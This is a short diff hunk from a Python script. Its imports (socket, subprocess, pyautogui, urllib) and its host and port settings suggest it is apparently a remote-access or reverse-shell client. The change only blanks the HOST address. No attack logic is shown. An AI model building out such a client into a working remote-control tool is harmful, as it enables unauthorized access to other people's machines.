@@ -2,7 +2,7 @@ import socket, subprocess, os, time, platform, sys, urllib.request, re, pyautogu
 from io import StringIO # Purpose: Python Interpreter (receiving output)
 
 # Socket Properties
-HOST = "192.168.2.190"
+HOST = ""
 PORT = 10000
 buffer = 0x400
 
